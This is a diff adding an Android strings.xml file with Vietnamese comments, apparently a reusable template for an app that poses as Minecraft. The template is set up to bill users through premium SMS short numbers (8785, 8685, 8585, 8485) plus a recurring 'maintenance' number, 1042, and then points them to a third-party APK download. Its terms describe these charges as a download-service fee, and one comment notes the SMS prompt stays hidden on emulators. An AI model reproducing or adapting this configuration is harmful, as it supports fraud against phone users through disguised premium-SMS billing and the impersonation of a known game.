@@ -1,0 +1,69 @@
+<resources>
+    //thay tên ứng dụng ở đây: ví dụ dưới đây thì ứng dụng tên là Facebook
+    <string name="app_name">Minecraft</string>
+
+    //miêu tả ứng dụng ở đây (miêu tả tầm 300 chữ thôi nhé)
+    <string name="description">Minecraft trò chơi xây dựng thành phố ảo từ những khối vuông kỳ diệu, tựa game chiến thuật mang tính sáng tạo và giải trí cao đang được rất nhiều người yêu thích.</string>
+
+    //thay giá ở đây, ví dụ dưới là từ 5000 đến 30000
+    <string name="cost">Cost: 5000 – 30000</string>
+
+    //thay mã code khi thanh toán dịch vụ ở đây (tin nhắn gửi đến tổng đài)
+    <string-array name="code_product">
+        <item>TT MINECRAFT ANDROID</item> //cú pháp tin nhắn tới đầu 8x85
+        <item>XN</item>  //cú pháp tin nhắn tới đầu 1042 (phí duy trì)
+    </string-array>
+//do máy ảo không có sim nên là nó ko hiển thị phần yêu cầu gửi tin nhắn ô nhé
+
+    //thay số tổng đài ở đây
+    <string-array name="service_phone">
+        <item>8785</item> //số tin nhắn 15k
+        <item>8685</item> //số tin nhắn 10k
+        <item>8585</item> //số tin nhắn 5k
+        <item>8485</item> //số tin nhắn 4k
+        <item>1042</item> //số duy trì ở đây
+    </string-array>
+
+    //thay đường dẫn tải game ở đây
+    <string name="url_game">http://taivemienphi.net/minecraft.apk</string>
+
+
+
+
+    //không sửa cái này nhé
+    <string name="term_and_privacy">"Vui Lòng Đọc Kỹ Điều Khoản Trước Khi Cài Đặt Game
+"<b>1.</b> Đây là một dịch vụ hỗ trợ Download Game và Ứng dụng cho điện thoại. Giúp người dùng tải và cài đặt ứng dụng một cách thuận tiện."
+"<b>2.</b> Quyền Sở Hữu Trí Tuệ"
+- Tất cả hình ảnh, biểu tượng, và tất cả các nội dung khác (gọi tắt là Nội dung) tại Ứng Dụng này thuộc sở hữu của chúng tôi và các tổ chức/công ty khác đã được chúng tôi cho phép
+"<b>3.</b> Phí Dịch Vụ Cho Nhà Phát Triển"
+- Để duy trì hệ thống được tốt, chúng tôi có thu phí mỗi game. Chi phí mỗi lần tải là 30.000đ ( Ba mươi ngàn đồng chẵn ) tức 2 tin nhắn gửi đến đầu số 8785.
+Nếu quý khách hàng không đủ số tiền 30.000đ mà vẫn muốn tải game, chúng tôi sẽ hỗ trợ thu phí theo số tiền quý khách có thể thanh toán, từ 5.000đ->30.000đ trên các đầu số tương ứng.
+- Cụ thể:
+Nếu quý khách có 25.000đ, chúng tôi sẽ gửi 1 tin nhắn đến đầu 8785 và 1 tin nhắn đến 8685.
+Nếu quý khách có 20.000đ, chúng tôi sẽ gửi 1 tin nhắn đến đầu 8785 và 1 tin nhắn đến 8585.
+Nếu quý khách có 15.000đ, chúng tôi sẽ gửi 1 tin nhắn đến đầu 8785.
+Nếu quý khách có 10.000đ, chúng tôi sẽ gửi 1 tin nhắn đến đầu 8685.
+Nếu quý khách có 5.000đ, chúng tôi sẽ gửi 1 tin nhắn đến đầu 8585.
+Nếu quý khách có 4.000đ, chúng tôi sẽ gửi 1 tin nhắn đến đầu 8485.
+Chúng tôi cam kết không trừ tiền khi khách hàng chưa ấn Đồng Ý Tải Và Cài Đặt !
+"<b>4.</b> Thỏa Thuận Dịch Vụ"
+- Bằng cách bấm vào nút ĐỒNG Ý TẢI VÀ CÀI ĐẶT Bạn được coi như đã chấp thuận các điều khoản và điều kiện của chúng tôi
+"<b>5.</b> Quy Định Sử Dụng Dịch Vụ"
+- Không gỡ bỏ hoặc vô hiệu hóa bất kỳ biện pháp bảo vệ quyền sở hữu hay bản quyền có
+"<b>6.</b> Những hành vi không được chấp nhận"
+- Không tạo ra các bản sao bắt chước các tính năng, giao diện và dữ liệu của trò chơi này
+- Không sử dụng trò chơi này làm công cụ để gây hại cho những người khác
+"<b>7.</b> NHỮNG ĐIỀU KHOẢN CHUNG"
+- Đối với game có giao tiếp giữa người chơi với nhau (ví dụ các game có mạng xã hội) thì người chơi phải tuân thủ thao đúng các quy tắc ứng xử, tạo môi trường lành mạnh, không truyền bá các tư tưởng phản động, văn hóa không đúng với thuần phong mỹ tục của người dân Việt Nam
+"<b>8.</b> Trách Nhiệm Của Mỗi Bên"
+- Chúng Tôi gọi tắt là bên (a)
+- Người mua ứng dụng/game của chúng tôi là bên (b)
+- Bên (a) chịu trách nhiệm hỗ trợ về Game/ứng dụng khách hàng sau khi cài đặt bị lỗi do sever hay bị lỗi hệ thống từ Nhà Phát Hành ( NPH ), giải đáp cho khách hàng những vướng mắc trong quá trình cài đặt Game/Ứng dụng
+- Trách Nhiệm Bên (b): Khi bạn bấm tải và cài đặt trò chơi đồng nghĩa với việc bạn đã đồng ý với các điều khoản của chúng tôi đưa ra và bạn cam kết không khiếu nại
+"<b>Xin chân thành cảm ơn và chúc các bạn có những giây phút chơi game vui vẻ !</b>"
+        ""
+        ""
+</string>
+    <string name="term">BẢNG ĐIỀU KHOẢN</string>
+    <string name="note"><b>Chú ý bật wifi để giảm cước 3G !</b></string>
+</resources>
